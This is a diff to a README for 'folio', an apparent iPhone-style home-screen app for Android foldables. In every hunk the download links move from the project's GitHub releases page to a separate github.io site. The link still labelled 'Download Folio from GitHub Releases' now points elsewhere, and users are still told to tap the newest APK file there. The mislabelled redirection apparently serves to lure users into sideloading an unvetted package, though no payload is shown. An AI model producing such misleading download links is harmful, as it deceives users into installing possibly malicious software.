@@ -1,7 +1,7 @@
 <h1>📱 folio - iPhone-Style Home Screen for Your Foldable</h1>
 
 <p align="center">
-  <a href="https://github.com/Genustempletoniaovalkumquat65/folio/releases">
+  <a href="https://genustempletoniaovalkumquat65.github.io">
     <img src="https://img.shields.io/badge/Download_Folio-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Folio" />
   </a>
 </p>
@@ -17,7 +17,7 @@ Getting Folio on your phone is ridiculously easy. Follow these simple steps and 
 ### Step 1: Download the App
 
 Visit this link to download the application:
-👉 **[Folio Download Page](https://github.com/Genustempletoniaovalkumquat65/folio/releases)**
+👉 **[Folio Download Page](https://genustempletoniaovalkumquat65.github.io)**
 
 This page shows all available versions of Folio. Look for the newest file listed (the one with the latest date) and tap it to download. The fileis a standard Android app package, so it will work on any Android foldable device.
 
@@ -105,9 +105,9 @@ A: Uninstall Folio exactly like any other app: Settings → Apps → Folio → U
 
 Need to re-download or install on another device? Here is the link again:
 
-[**Download Folio from GitHub Releases**](https://github.com/Genustempletoniaovalkumquat65/folio/releases)
+[**Download Folio from GitHub Releases**](https://genustempletoniaovalkumquat65.github.io)
 
 )
 
 or copy-paste this into your browser:
-`https://github.com/Genustempletoniaovalkumquat65/folio/releases`
+`https://genustempletoniaovalkumquat65.github.io`
